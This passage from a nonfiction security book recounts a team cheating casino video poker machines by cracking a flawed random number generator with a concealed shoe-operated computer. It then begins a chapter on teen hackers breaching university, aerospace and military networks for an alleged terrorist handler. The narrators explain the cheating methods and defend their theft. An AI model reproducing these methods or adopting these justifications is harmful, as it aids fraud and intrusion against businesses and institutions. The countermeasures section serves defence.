promised the security and paid off somebody inside the casino. He con-
jectures that they might even have replaced the gold master that they’re
supposed to compare the machine’s chip against. 
The beauty of his team’s hack, Alex insisted, was that they didn’t have
to change the firmware. And they thought their own approach offered
much more of a challenge.
The team couldn’t keep winning as big as they were; the guys figured
“it was clear that somebody would put two and two together and say,
‘I’ve seen this guy before.’ We started to get scared that we were gonna
get caught.” 
Beside the ever-present worries about getting caught, they were also
concerned about the tax issue; for any win over $1,200, the casino asks
for identification and reports the payout to the IRS. Mike says that “If
the player doesn’t produce ID, we assumed that taxes would be withheld
from the payout, but we didn’t want to draw attention to ourselves by
finding out.” Paying the taxes was “not a big issue,” but “it starts to cre-
ate a record that, like, you’re winning insane amounts of money. So a lot
of the logistics were about, ‘How do we stay under the radar?’” 
They needed to come up with a different approach. After a short time
of “E.T. phone home,” they started to conceive a new idea.
New Approach
The guys had two goals this time around: Develop a method that would
let them win on hands like a full house, straight, or flush, so the payouts
wouldn’t be humongous enough to attract attention. And make it some-
how less obvious and less annoying than having to run to the telephone
before every play.Chapter 1 Hacking the Casinos for a Million Bucks
 1105_569597 ch01.qxd  1/11/05  9:27 PM  Page 11

Because the casinos offered only a limited number of the Japanese
machines, the guys this time settled on a machine in wider use, a type
manufactured by an American company. They took it apart the same way
and discovered that the random number generation process was much
more complex: The machine used two generators operating in combina-
tion, instead of just one. “The programmers were much more aware of
the possibilities of hacking,” Alex concluded.
But once again the four discovered that the designers had made a cru-
cial mistake. “They had apparently read a paper that said you improve the
quality of randomness if you add a second register, but they did it
wrong.” To determine any one card, a number from the first random
number generator was being added to a number from the second. 
The proper way to design this calls for the second generator to
iterate — that is, change its value — after each card is dealt. The design-
ers hadn’t done that; they had programmed the second register to iterate
only at the beginning of each hand, so that the same number was being
added to the result from the first register for each card of the deal. 
To Alex, the use of two registers made the challenge “a cryptology
thing”; he recognized that it was similar to a step sometimes used in
encrypting messages. Though he had acquired some knowledge of the
subject, it wasn’t enough to see his way to a solution, so he started mak-
ing trips to a nearby university library to study up. 
If the designers had read some of the books on cryptosystems more
carefully, they wouldn’t have made this mistake. Also, they should
have been more methodical about testing the systems for cracking
the way we were cracking them. 
Any good college computer science major could probably write
code to do what we were trying to do once he understands what’s
required. The geekiest part of it was figuring out algorithms to do
the search quickly so that it would only take a few seconds to tell
you what’s going on; if you did it naively, it could take a few
hours to give you a solution. 
We’re pretty good programmers, we all still make our living
doing that, so we came up with some very clever optimizations.
But I wouldn’t say it was trivial. 
I remember a similar mistake made by a programmer at Norton (before
Symantec bought them) that worked on their Diskreet product, an appli-
cation that allowed a user to create encrypted virtual drives. The developer
implemented the algorithm incorrectly — or perhaps intentionally — in a
way that resulted in reducing the space for the encryption key from 56The Art of Intrusion 1205_569597 ch01.qxd  1/11/05  9:27 PM  Page 12

bits to 30. The federal government’s data encryption standard used a 
56-bit key, which was considered unbreakable, and Norton gave its cus-
tomers the sense that their data was protected to this standard. Because
of the programmer’s error, the user’s data was in effect being encrypted
with only 30 bits instead of 56. Even in those days, it was possible to
brute-force a 30-bit key. Any person using this product labored under a
false sense of security: An attacker could derive his or her key in a rea-
sonable period and gain access to the user’s data. The team had discov-
ered the same kind of error in the programming of the machine.
At the same time the boys were working on a computer program that
would let them win against their new target machine, they were pressing
Alex for a no-more-running-to-the-payphone approach. The answer
turned out to be based on taking a page from the Eudaemonic Pie solu-
tion: a “wearable” computer. Alex devised a system made up of a minia-
turized computer built around a small microprocessor board Mike and
Marco found in a catalog — and, to go along with it, a control button
that fit in the shoe, plus a silent vibrator like the ones common in many
of today’s cell phones. They referred to the system as their “computer-
in-the-pocket thing.” 
“We had to be a little clever about doing it on a small chip with a small
memory,” Alex said. “We did some nice hardware to make it all fit in the
shoe and be ergonomic.” (By “ergonomic” in this context, I think he
meant small enough so you could walk without limping!)
The New Attack
The team began trying out the new scheme, and it was a bit nerve-
wracking. Sure, they could now dispense with the suspicious behavior of
running to a pay phone before every win. But even with all the dress
rehearsal practice back at their “office,” opening night meant performing
in front of a sizeable audience of always-suspicious security people. 
This time the program was designed so they could sit at one machine
longer, winning a series of smaller, less suspicious amounts. Alex and
Mike recapture some of tension when they describe how it worked:
Alex: I usually put the computer in what looked like a little tran-
sistor radio in my pocket. We would run a wire from the computer
down inside the sock into this switch in the shoe. 
Mike: I strapped mine to my ankle. We made the switches from
little pieces of breadboard [material used in a hardware lab for
constructing mock-ups of electronic circuits]. The pieces were
about one inch square, with a miniature button. And we sewed
on a little bit of elastic to go around the big toe. Then you’d cut aChapter 1 Hacking the Casinos for a Million Bucks

hole in a Dr. Scholl’s insole to keep it in place in your shoe. It was
only uncomfortable if you were using it all day; then it could get
excruciating. 
Alex: So you go into the casino, you try to look calm, act like
there’s nothing, no wires in your pants. You go up, you start play-
ing. We had a code, a kind of Morse Code thingy. You put in
money to run up a credit so you don’t have to keep feeding coins,
and then start to play. When cards come up, you click the shoe
button to input what cards are showing. 
The signal from the shoe button goes into the computer that’s in
my pants pocket. Usually in the early machines it took seven or
eight cards to get into sync. You get five cards on the deal, you
might draw three more would be a very common thing, like hold
the pair, draw the other three, that’s eight cards. 
Mike: The code for tapping on the shoe-button was binary, and it
also used a compression technique something like what’s called a
Huffman code. So long-short would be one-zero, a binary two.
Long-long would be one-one, a binary three, and so on. No card
required more than three taps. 
Alex: If you held the button down for three seconds, that was a
cancel. And [the computer] would give you little prompts — like
dup-dup-dup would mean, “Okay, I’m ready for input.” We had
practiced this — you had to concentrate and learn how to do it.
After a while we could tap, tap while carrying on a conversation
with a casino attendant.
Once I had tapped in the code to identify about eight cards, that
would be enough for me to sync with about 99 percent assurance.
So after anywhere from a few seconds to a minute or so, the com-
puter would buzz three times.
I’d be ready for the action.
At this point, the computer-in-the-pocket had found the place in the
algorithm that represented the cards just dealt. Since its algorithm was
the same as the one in the video poker machine, for each new hand dealt,
the computer would “know” what five additional cards were in waiting
once the player selected his discards and would signal which cards to hold
to get a winning hand. Alex continued:
The computer tells you what to do by sending signals to a vibra-
tor in your pocket; we got the vibrators free by pulling them out of
old pagers. If the computer wants you to hold the third and theThe Art of Intrusion 1405_569597 ch01.qxd  1/11/05  9:27 PM  Page 14

fifth card, it will go beep, beep, beeeeep, beep, beeeeep, which you
feel as vibrations in your pocket. 
We computed that if we played carefully, we had between 20 and
40 percent vigorish, meaning a 40 percent advantage on every
hand. That’s humongous — the best blackjack players in the
world come in at about 2-1/2 percent.
If you’re sitting at a $5 machine pumping in five coins at a time,
twice a minute, you can be making $25 a minute. In half an
hour, you could easily make $1,000 bucks. People sit down and get
lucky like that every day. Maybe 5 percent of the people that sit
down and play for half an hour might do that well. But they don’t
do it every time. We were making that 5 percent every single time. 
Whenever one of them had won big in one casino, he’d move on to
another. Each guy would typically hit four or five in a row. When they
went back to the same casino on another trip a month later, they’d make
a point of going at a different time of day, to hit a different shift of the
work crew, people less likely to recognize them. They also began hitting
casinos in other cities — Reno, Atlantic City, and elsewhere.
The trips, the play, the winning gradually became routine. But on one
occasion, Mike thought the moment they all dreaded had come. He had
just “gone up a notch” and was playing the $25 machines for the first
time, which added to the tension because the higher the value of the
machines, the closer they’re watched.
I was a bit anxious but things were going better than I antici-
pated. I won about $5,000 in a relatively short amount of time.
Then this large, imposing employee taps me on the shoulder. I
looked up at him feeling something queasy in the pit of my stom-
ach. I thought, “This is it.”
“I notice you been playing quite a bit,” he said. “Would you like
pink or green?”
If it had been me, I would have been wondering, “What are those —
my choices of the color I’ll be after they finish beating me to a pulp?” I
think I might have left all my money and tried to dash out of the place.
Mike says he was seasoned enough by that point to remain calm.
The man said, “We want to give you a complimentary coffee mug.” 
Mike chose the green. Chapter 1 Hacking the Casinos for a Million Bucks
 1505_569597 ch01.qxd  1/11/05  9:27 PM  Page 15

Marco had his own tense moment. He was waiting for a winning hand
when a pit boss he hadn’t noticed stepped up to his shoulder. “You dou-
bled up to five thousand dollars — that’s some luck,” he said, surprised.
An old woman at the next machine piped up in a smoker’s raspy sandpa-
per voice, “It ... wasn’t ... luck.” The pit boss stiffened, his suspicions
aroused. “It was balls,” she cawed. The pit boss smiled and walked away.
Over a period of about three years, the guys alternated between taking
legitimate consulting jobs to keep up their skills and contacts, and skip-
ping out now and then to line their pockets at the video poker machines.
They also bought two additional machines, including the most widely
used video poker model, and continued to update their software.
On their trips, the three team members who traveled would head out
to different casinos, “not all go as a pack,” Alex said. “We did that once
or twice, but it was stupid.” Though they had an agreement to let each
other know what they were up to, occasionally one would slip away to
one of the gambling cities without telling the others. But they confined
their play to casinos, never playing in places like 7-Elevens or supermar-
kets because “they tend to have very low payouts.”
Caught!
Alex and Mike both tried to be disciplined about adhering to “certain
rules that we knew were going to reduce the probability of getting
noticed. One of them was to never hit a place for too much money, never
hit it for too much time, never hit it too many days in a row.”
But Mike took the sense of discipline even more seriously and felt the
other two weren’t being careful enough. He accepted winning a little less
per hour but looking more like another typical player. If he got two aces
on the deal and the computer told him to discard one or both of the aces
for an even better hand — say, three jacks — he wouldn’t do it. All casi-
nos maintain “Eye in the Sky” watchers in a security booth above the
casino floor, manning an array of security cameras that can be turned,
focused and zoomed, searching for cheaters, crooked employees, and
others bent by the temptation of all that money. If one of the watchers
happened to be peeking at his or her machine for some reason, the
watcher would immediately know something was fishy, since no reason-
able player would give up a pair of aces. Nobody who wasn’t cheating
somehow could know a better hand was waiting.
Alex wasn’t quite so fastidious. Marco was even less so. “Marco was a
bit cocky,” in Alex’s opinion: 
He’s a very smart guy, self taught, never finished high school, but one
of these brilliant Eastern European type of guys. And flamboyant.The Art of Intrusion 1605_569597 ch01.qxd  1/11/05  9:27 PM  Page 16

He knew everything about computers but he had it in his head
that the casinos were stupid. It was easy to think that because these
people were letting us get away with so much. But even so, I think
he got over-confident.
He was more of a daredevil, and also didn’t fit the profile because
he just looked like this teenage foreigner. So I think he tended to
arouse suspicion. And he didn’t go with a girlfriend or wife,
which would have helped him fit in better.
I think he just ended up doing things that brought attention onto
him. But also, as time went on and we all got bolder, we evolved
and tended to go to the more expensive machines that paid off bet-
ter and that again put more risks into the operation.
Though Mike disagrees, Alex seemed to be suggesting that they were
all three risk takers who would keep pushing the edge of the window to
see how far they could go. As he put it, “I think basically you just keep
upping the risk.”
The day came when one minute Marco was sitting at a machine in a
casino, the next minute he was surrounded by burly security people who
pulled him up and pushed him into an interviewing room in the back.
Alex recounted the scene:
It was scary because you hear stories about these guys that will
beat the shit out of people. These guys are famous for, “F__k the
police, we’re gonna take care of this ourself.”
Marco was stressed but he was a very tough character. In fact, in
some ways I’m glad that he was the one that did get caught if any
of us were going to because I think he was the most equipped to
handle that situation. For all I know he had handled things like
back in Eastern Europe. 
He exhibited some loyalty and did not give us up. He didn’t talk
about any partners or anything like that. He was nervous and
upset but he was tough under fire and basically said he was work-
ing alone. 
He said, “Look, am I under arrest, are you guys police, what’s the
deal?” 
It’s a law enforcement type of interrogation except that they’re
not police and don’t have any real authority, which is kind of
weird. They kept on questioning him, but they didn’t exactly
manhandle him.Chapter 1 Hacking the Casinos for a Million Bucks
 1705_569597 ch01.qxd  1/11/05  9:27 PM  Page 17

They took his “mug shot,” Alex says, and they confiscated the com-
puter and all the money he had on him, about $7,000 in cash. After per-
haps an hour of questioning, or maybe a lot longer — he was too upset
to be sure — they finally let him go. 
Marco called his partners en route home. He sounded frantic. He said,
“I want to tell you guys what happened. I sort of screwed up.”
Mike headed straight for their headquarters. “Alex and I were freaked
when we heard what happened. I started tearing the machines apart and
dumping pieces all over the city.” 
Alex and Mike were both unhappy with Marco for one of the unneces-
sary risks he ran. He wouldn’t put the button in his shoe like the other
two, stubbornly insisting on carrying the device in his jacket pocket and
triggering it with his hand. Alex described Marco as a guy who “thought
the security people were so dumb that he could keep pushing the enve-
lope with how much he was doing right under their noses.”
Alex is convinced he knows what happened, even though he wasn’t
present. (In fact, the other three didn’t know Marco had gone on a
casino trip despite the agreement to clue each other in on their plans.)
The way Alex figures, “They just saw that he was winning a ridiculous
amount and that there was something going on with his hand.” Marco
simply wasn’t bothering to think about what could cause the floor peo-
ple to notice him and wonder.
That was the end of it for Alex, though he’s not entirely sure about the
others. “Our decision at the beginning was that if any of us was ever
caught, we would all stop.” He said, “We all adhered to that as far as I
know.” And after a moment, he added with less certainty, “At least I
did.” Mike concurs, but neither of them has ever asked Marco the ques-
tion directly.
The casinos don’t generally prosecute attacks like the one that the guys
had pulled. “The reason is they don’t want to publicize that they have
these vulnerabilities,” Alex explains. So it’s usually, “Get out of town
before sundown. And if you agree never to set foot in a casino again, then
we’ll let you go.”
Aftermath
About six months later, Marco received a letter saying that charges
against him were not being pressed.
The four are still friends, though they aren’t as close these days. Alex
figures he made $300,000 from the adventure, part of which went to
Larry as they had agreed. The three casino-going partners, who took allThe Art of Intrusion 1805_569597 ch01.qxd  1/11/05  9:27 PM  Page 18

the risk, had initially said they would split equally with each other, but
Alex thinks Mike and Marco probably took $400,000 to half a million
each. Mike wouldn’t acknowledge walking away with any more than
$300,000 but admits that Alex probably got less than he did. 
They had had a run of about three years. Despite the money, Alex was
glad it was over: “In a sense, I was relieved. The fun had worn off. It had
become sort of a job. A risky job.” Mike, too, wasn’t sorry to see it end,
lightly complaining that “it got kind of grueling.” 
Both of them had been reluctant at first about telling their story but
then took to the task with relish. And why not — in the 10 or so years
since it happened, none of the four has ever before shared even a whis-
per of the events with anyone except the wives and the girlfriend who
were part of it. Telling it for the first time, protected by the agreement of
absolute anonymity, seemed to come as a relief. They obviously enjoyed
reliving the details, with Mike admitting that it had been “one of the
most exciting things I’ve ever done.”
Alex probably speaks for them all when he expresses his attitude toward
their escapade:
I don’t feel that bad about the money we won. It’s a drop in the
bucket for that industry. I have to be honest: we never felt morally
compromised, because these are the casinos. 
It was easy to rationalize. We were stealing from the casinos that
steal from old ladies by offering games they can’t win. Vegas felt
like people plugged into money-sucking machines, dripping their
life away quarter by quarter. So we felt like we were getting back
at Big Brother, not ripping off some poor old lady’s jackpot.
They put a game out there that says, “If you pick the right cards,
you win.” We picked the right cards. They just didn’t expect any-
body to be able to do it.
He wouldn’t try something like this again today, Alex says. But his rea-
son may not be what you expect: “I have other ways of making money.
If I were financially in the same position I was in then, I probably would
try it again.” He sees what they did as quite justified.
In this cat-and-mouse game, the cat continually learns the mouse’s new
tricks and takes appropriate measures. The slot machines these days use
software of much better design; the guys aren’t sure they would be suc-
cessful if they did try to take another crack at it. 
Still, there will never be a perfect solution to any techno-security issue.
Alex puts the issue very well: “Every time some [developer] says,Chapter 1 Hacking the Casinos for a Million Bucks
 1905_569597 ch01.qxd  1/11/05  9:27 PM  Page 19

‘Nobody will go to the trouble of doing that,’ there’s some kid in Finland
who will go to the trouble.”
And not just in Finland but in America, as well.
INSIGHT
In the 1990s, the casinos and the designers of gambling machines hadn’t
yet figured out some things that later became obvious. A pseudo random
number generator doesn’t actually generate random numbers. Instead, it
in effect warehouses a list of numbers in a random order. In this case, a
very long list: 2 to the 32nd power, or over four billion numbers. At the
start of a cycle, the software randomly selects a place in the list. But after
that, until it starts a new cycle of play, it uses the ensuing numbers from
the list one after the other.
By reverse-engineering the software, the guys had obtained the list.
From any known point in the “random” list, they could determine every
subsequent number in the list, and with the additional knowledge about
the iteration rate of a particular machine, they could determine how long
in minutes and seconds before the machine would display a royal flush.
COUNTERMEASURES
Manufacturers of every product that uses ROM chips and software
should anticipate security problems. And for every company that uses
software and computer-based products — which these days means pretty
nearly every company down to one-person shops — it’s dangerous to
assume that the people who build your systems have thought about all
the vulnerabilities. The programmers of the software in the Japanese slot
machine had made a mistake in not thinking far enough ahead about
what kinds of attacks might be made. They hadn’t taken any security
measures to protect people from getting at the firmware. They should
have foreseen somebody gaining access to a machine, removing the
ROM chip, reading the firmware, and recovering the program instruc-
tions that tell the machine how to work. Even if they considered that pos-
sibility, they probably assumed that knowing precisely how the machine
worked wouldn’t be enough, figuring that the computational complexity
of cracking the random number generator would defeat any attempt —
which may well be true today but was not at the time.
So your company markets hardware products that contain computer
chips; what should you be doing to provide adequate protection againstThe Art of Intrusion 2005_569597 ch01.qxd  1/11/05  9:27 PM  Page 20

the competitor who wants a look at your software, the foreign company
that wants to do a cheap knockoff, or the hacker who wants to cheat you? 
The first step: Make it difficult to gain access to the firmware. Several
approaches are available, including:
●Purchase chips of a type designed to be secure against attack.
Several companies market chips specifically designed for situ-
ations where the possibility of attack is high. 
●Use chip on-board packaging — a design in which the chip is
embedded into the circuit board and cannot be removed as a
separate element.
●Seal the chip to the board with epoxy, so that if an attempt is
made to remove it, the chip will break. An improvement on
this technique calls for putting aluminum powder in the
epoxy; if an attacker attempts to remove the chip by heating
the epoxy, the aluminum destroys the chip. 
●Use a ball grid array (BGA) design. In this arrangement, the
connectors do not come out from the sides of the chip but
instead are beneath the chip, making it difficult if not impos-
sible to capture signal flow from the chip while it is in place
on the board.
Another available countermeasure calls for scratching any identifying
information off the chip, so an attacker will be deprived of information
about the manufacturer and type of chip.
A fairly common practice, one used by the machine manufacturers in
this story, calls for the use of checksumming ( hashing ) — including a
checksum routine in the software. If the program has been altered, the
checksum will not be correct and the software will not operate the device.
However, knowledgeable hackers familiar with this approach simply
check the software to see whether a checksum routine has been included,
and if they find one, disable it. So one or more of the methods that pro-
tect the chip physically is a much better plan. 
THEBOTTOM LINE
If your firmware is proprietary and valuable, consult the best security
sources to find out what techniques hackers are currently using. Keep
your designers and programmers up-to-date with the latest information.
And be sure they are taking all appropriate steps to achieve the highest
level of security commensurate with cost.Chapter 1 Hacking the Casinos for a Million Bucks

Chapter 2
When Terrorists Come Calling
I don’t know why I kept doing it. Compulsive nature? Money hungry? Thirst
for power? I can name a number of possibilities. 
— ne0h
The 20-year-old hacker who signs as Comrade is just hanging
around these days in a house that he owns jointly with his
brother in a nice part of Miami. Their father lives with them,
but that’s only because the kid brother is still a juvenile and Child
Services insists there be an adult living in the home until the boy turns
18. The brothers don’t mind, and Dad has his own apartment elsewhere,
which he’ll move back to when the time comes.
Comrade’s mom died two years ago, leaving the house to her sons
because she and the boys’ father were divorced. She left some cash as
well. His brother goes to high school, but Comrade is “just hanging
out.” Most of his family disapproves, he says, “but I don’t really care.”
When you’ve been to prison at a young age — in fact, the youngest per-
son ever convicted on federal charges as a hacker — the experience tends
to change your values.
Hacking knows no international borders, of course, so it makes no dif-
ference to either of them that Comrade’s hacker friend ne0h is some
3,000 miles away. Hacking was what brought them together, and hack-
ing was what took them along a slippery course that would eventually
lead to what they would later conjecture was serving the cause of inter-
national terrorism by conducting break-ins to highly sensitive computer
systems. These days, that’s a heavy burden to bear.06_569597 ch02.qxd  1/11/05  9:24 PM  Page 23

A year older than Comrade, ne0h has been “using computers since I
could reach the keyboard.” His father ran a computer hardware store and
would take the youngster along on customer appointments; the boy
would sit on his father’s lap through the sales session. By age 11, he was
writing dBase code for his father’s business.
Somewhere along the line, ne0h came upon a copy of the book
Takedown (Hyperion Press, 1996) — which is a highly inaccurate
account of my own hacking exploits, my three years on the run, and the
FBI’s search for me. ne0h was captivated by the book:
You inspired me. You’re my f___ing mentor. I read every possible
thing about what you did. I wanted to be a celebrity just like you.
It was the motivation that got him into hacking. He decorated his
room with computers and networking hubs and a 6-foot-long pirate flag,
and set out to walk in my footsteps.
ne0h began to accumulate solid hacker knowledge and capabilities.
Skills came first; discretion would come later. Using the hackers’ term for
a youngster who’s still a beginner, he explained, “In my script kiddie
days, I defaced Web sites and put up my real email address.” 
He hung around Internet Relay Chat (IRC) sites — text-based
Internet chat rooms where people with a common interest can meet
online and exchange information in real time with others who share the
interest — in fly fishing, antique airplanes, home brewing, or any of
thousands of other topics, including hacking. When you type in a mes-
sage on an IRC site, everybody online at that time sees what you’ve writ-
ten and can respond. Though many people who use IRC regularly don’t
seem to be aware of it, the communications can be easily logged. I think
the logs must by now contain nearly as many words as all the books in
the Library of Congress — and text typed in haste with little thought of
posterity can be retrieved even years later.
Comrade was spending time on some of the same IRC sites, and he
struck up a long-distance friendship with ne0h. Hackers frequently form
alliances for exchanging information and carrying out group attacks.
ne0h, Comrade, and another kid decided to create their own group,
which they dubbed the “Keebler Elves.” A few additional hackers were
allowed into the group’s conversations, but the three original members
kept the others in the dark about their black-hat attacks. “We were break-
ing into government sites for fun,” Comrade said. He estimates they
broke into “a couple of hundred” supposedly secure government sites.
A number of IRC channels are watering holes where hackers of differ-
ent stripes gather. One in particular, a network called Efnet, is a site
Comrade describes as “not exactly the computer underground — it’s aThe Art of Intrusion 2406_569597 ch02.qxd  1/11/05  9:24 PM  Page 24

pretty big group of servers.” But within Efnet were some less well-known
channels, places you didn’t find your way to on your own but had to be
told about by some other black hat whose trust you had gained. Those
channels, Comrade says, were “pretty underground.” 
Khalid the Terrorist Dangles Some Bait
Around 1998 on these “pretty underground” channels, Comrade began
encountering chat about a guy who had been “hanging around” using
the handle RahulB. (Later he would also use Rama3456.) “It was sort of
known that he wanted hackers to break into government and military
computers — .gov and .mil sites,” Comrade said. “Rumor had it that he
worked for Bin Laden. This was before 9/11, so Bin Laden wasn’t a
name you heard on the news every day.” 
Eventually Comrade crossed paths with the mystery man, who he
would come to know as Khalid Ibrahim. “I talked to him a few times [on
IRC] and I talked to him on the phone once.” The man had a foreign
accent and “it definitely sounded like an overseas connection.”
ne0h, too, was targeted; with him Khalid was more direct and more
blatant. ne0h recalls:
Around 1999, I was contacted by email by a man who called him-
self a militant and said he was in Pakistan. He gave the name
Khalid Ibrahim. He told me he worked for Pakistani militants. 
Would someone looking for naive kid hackers really wrap himself in a
terrorist flag — even in the days before 9/11? At first glance the notion
seems absurd. This man would later claim he had gone to school in the
United States, done a little hacking himself, and associated with hackers
while he was here. So he may have known, or thought he knew, some-
thing of the hacker’s mindset. Every hacker is to some extent a rebel who
lives by different standards and enjoys beating the system. If you want to
set out a honeypot for hackers, maybe announcing that you too are a
rule-breaker and an outsider wouldn’t be so stupid after all. Maybe it
would make your story all the more believable, and your intended con-
federates that much less wary and suspicious.
And then there was the money. Khalid offered ne0h $1,000 for hack-
ing into the computer networks of a Chinese university — a place that
ne0h refers to as the MIT of China — and providing him the student
database files. Presumably this was a test, both of ne0h’s hacking ability
and of his ingenuity: How do you hack into a computer system when you
don’t read the language? Even harder: How do you social engineer your
way in when you don’t speak the language? Chapter 2 When Terrorists Come Calling
 2506_569597 ch02.qxd  1/11/05  9:24 PM  Page 25

For ne0h, the language issue turned out to be no barrier at all. He
began hanging around the IRC sites used by a hacker group called
gLobaLheLL and through that group had made contact with a computer
student at the university. He got in touch and asked the student for a
couple of usernames and passwords. The sign-on information came back
in short order — one hacker to another, no questions asked. ne0h found
that computer security at the university ranked somewhere between
dreadful and lousy, especially surprising for a technology/engineering
university where they should have known better. Most of the students
have chosen passwords identical to their usernames — the same word or
phrase for both uses.
The short list that the student had provided was enough to give ne0h
access, allowing him to start snooping around electronically — sniffing ,
in hackerspeak. This turned up a student — we’ll call him Chang — who
was accessing FTPs (download sites) in the United States. Among these
FTPs was a “warez” site — a place for retrieving software. Using a stan-
dard social engineering trick, ne0h drifted around the college network
picking up some of the campus lingo. This was easier than it at first
sounds, since “most of them speak English,” ne0h says. Then he got in
touch with Chang, using an account that made it seem as if ne0h was
contacting him from the campus computer science lab. 
“I’m from Block 213,” he told Chang electronically, and he made a
straightforward request for student names and e-mail addresses, like any
student interested in getting in touch with classmates. Because most of the
passwords were so easy, getting into the student’s files was a no-brainer. 
Very soon he was able to deliver to Khalid database information on
about a hundred students. “I gave him those and he said, ‘I’ve got all I
need.’” Khalid was satisfied; clearly he hadn’t wanted the names at all; he
had just wanted to see if ne0h could actually come up with the informa-
tion from such a remote source. “That’s pretty much where our rela-
tionship started,” ne0h sums up. “I could do the job, he knew I could
do the job, so he started giving me other things to do.” 
Telling ne0h to watch his mailbox for his thousand dollars, Khalid
started calling by cell phone about once a week, “usually while he was
driving.” The next assignment was to hack into the computer systems of
India’s Bhabha Atomic Research Center. The outfit was running a Sun
workstation, which is familiar ground for every hacker. ne0h got into it
easily enough but found the machine didn’t have any information of
interest on it and appeared to be a standalone, not connected to any net-
work. Khalid seemed unfazed by the failure.
Meanwhile, the money for the Chinese university hack still hadn’t
shown up. When ne0h asked, Khalid got upset. “You never got it?! I sent
it to you in cash in a birthday card!” he insisted. Obviously this was theThe Art of Intrusion 2606_569597 ch02.qxd  1/11/05  9:24 PM  Page 26

timeworn “Your check is in the mail” ploy, yet ne0h was willing to keep
on accepting assignments. Why? Today he leans toward introspection:
I kept on because I’m stubborn. It was actually a thrill to think I
was going to be paid for it. And I was thinking, “Maybe it really
was lost in the mail, maybe he will pay me this time.” 
I don’t know why I kept doing it. Compulsive nature? Money
hungry? Thirst for power? I can name a number of possibilities. 
At the same time that Khalid was feeding assignments to ne0h, he was
also trolling the IRC sites for other willing players. Comrade was willing,
though wary of accepting payment:
I had understood that he was paying people but I never wanted to
give out my information in order to receive money. I figured that
what I was doing was just looking around, but if I started receiv-
ing money, it would make me a real criminal. At most I would
talk to him on IRC and throw him a few hosts now and then. 
Reporter Niall McKay talked to another fish that Khalid caught in his
net, a California teen whose handle was Chameleon (and who is now
cofounder of a successful security software company). The McKay story on
Wired.com1dovetailed with the details provided by ne0h and Comrade.
“I was on IRC one night when this guy said he wanted the DEM soft-
ware. I didn’t have it and I was just messing about with the guy,” the
hacker claimed. By this time Khalid was growing serious: “DEM” is the
nickname for the Defense Information Systems Network Equipment
Manager, networking software used by the military. The program was cap-
tured by the hacker group Masters of Downloading, and word was get-
ting around that the program was available if you asked the right person.
No one seems to know whether Khalid ever got his hands on it — or at
least, no one is saying. In fact, it’s not even certain the software would
have been of any value to him — but he obviously thought it would.
Khalid was through playing games about Chinese universities and the like.
“He tried to integrate himself into what the guys in the group were
doing,” ne0h told us. Before it was over, Khalid would shadow the hackers
for a year and a half, “not like some random person popping in and out but
on a regular basis. He was just there, and it was understood that this was his
thing.” By “his thing,” ne0h meant breaking into military sites or the com-
puter systems of commercial companies working on military projects. 
Khalid asked ne0h to get into Lockheed Martin and obtain the
schematics of certain aircraft systems they were manufacturing for
Boeing. ne0h did succeed in getting some limited penetration intoChapter 2 When Terrorists Come Calling
 2706_569597 ch02.qxd  1/11/05  9:24 PM  Page 27

Lockheed, “about three steps into the internal network,” but couldn’t
get any deeper than two servers (to a level that security people call the
“DMZ” — in effect, a no-man’s-land). This was not far enough to pen-
etrate past the firewalls that protect the most sensitive corporate infor-
mation, and he couldn’t locate the information he had been told to look
for. According to ne0h:
[Khalid] got irritated. What he said was basically, “You’re not
working for me any more. You can’t do anything.” But then he
accused me of withholding. He said I was just keeping the infor-
mation for myself. 
Then he said, “Forget Lockheed Martin. Get directly into Boeing.” 
ne0h found that Boeing “wasn’t that secure, if you wanted it bad
enough.” He got in, he says, by exploiting a known vulnerability of a Boeing
system exposed to the Internet. Then, installing a “sniffer,” he was able to
eavesdrop on all the packets of data going to and from a computer — a kind
of computer wiretap. From this he was able to capture passwords and
unencrypted email. Information he gleaned from the emails revealed
enough intelligence to get into its internal network. 
I found six or seven schematics to doors and the nose of Boeing
747s — just getting passed through clear-text email.
Unencrypted attachments. Isn’t that great?! (And he laughs.)
Khalid was ecstatic. He said he was going to give me $4,000. It
never showed up — surprise, surprise.
In fact, $4,000 would have been a gross overpayment for the informa-
tion. According to former Boeing security executive Don Boelling, this
hack could well have been carried out against Boeing as described. But it
would have been a waste of time: Once an aircraft model goes into serv-
ice, all customer airlines are given complete sets of schematics. At that
point the information is no longer considered company-sensitive; any-
body who wants it can have it. “I even saw a CD of the 747 schematics
being offered on eBay recently,” Don said. Of course, Khalid would not
likely have known this. And it wouldn’t be until two years later that the
nation would find out some terrorists had strong reasons for wanting the
schematics of major transport planes used by U.S. airlines.
Target for Tonight: SIPRNET 
With Comrade, Khalid didn’t bother setting up test exercises. From the first,
the hacker says, Khalid “was only interested in military and SIPRNET.”The Art of Intrusion 2806_569597 ch02.qxd  1/11/05  9:24 PM  Page 28

Most things he wasn’t very specific about what he wanted — just
access to government and military sites. Except for SIPRNET.
He really wanted information from SIPRNET. 
No wonder Khalid was eager; this had probably been his target all along.
SIPRNET is the portion of DISN, the Defense Information System
Network, which carries classified messages. More than that, SIPRNET
(it’s an acronym for the Secret Internet Protocol Router Network) is now
the core of the command and control capability for the U.S. military. 
ne0h had already refused an offer from Khalid for a SIPRNET access:
He offered $2,000. I turned him down. If I got into SIPRNET,
I’d have the Feds knocking at my door. $2,000 wasn’t worth a
bullet in the head.
By the time Khalid spoke to Comrade about the assignment, the price
had gone up. “He said he would pay I think it was ten thousand dollars
for access,” Comrade remembers, sounding a good deal less skittish than
ne0h about taking on the project, though he insists convincingly that it
was the challenge, not the money, that tempted him.
I actually came pretty close to SIPRNET. I got into this one com-
puter system at the Defense Information Security Agency, DISA.
That computer was just slick. It had I think four processors, like,
2,000 users had access to it, the Unix host file had, like, 5,000 dif-
ferent hosts, and half of them were using privileged accounts; you
had to be on that computer to access it — you couldn’t access it
from the outside. 
However he figured it out, Comrade’s hunch that he had stumbled into
something important was on target. The core missions of DISA include
joint command and control, and combat support computing — a clear
overlap with the functions of SIPRNET. But his efforts were cut short. 
Pretty sweet to have all that access, but I never had enough time
to play around with it to get anywhere. I got busted, like, three or
four days later.
A Time for Worrying
On Christmas day 1999, ne0h and Comrade received a jolt. Indian
Airlines flight IC-814, en route from Katmandu to New Delhi with 178
passengers and 11 crew, was hijacked in flight. According to newsChapter 2 When Terrorists Come Calling
 2906_569597 ch02.qxd  1/11/05  9:24 PM  Page 29

reports, the hijackers were Pakistani terrorists associated with the Taliban.
Terrorists like Khalid?
Under orders of the hijackers, the Airbus A300 proceeded on a zigzag
journey to the Middle East and back, landing briefly in India, Pakistan,
and the United Arab Emirates, where the body of a slain passenger was
removed, a young man on the way home with his new wife from their
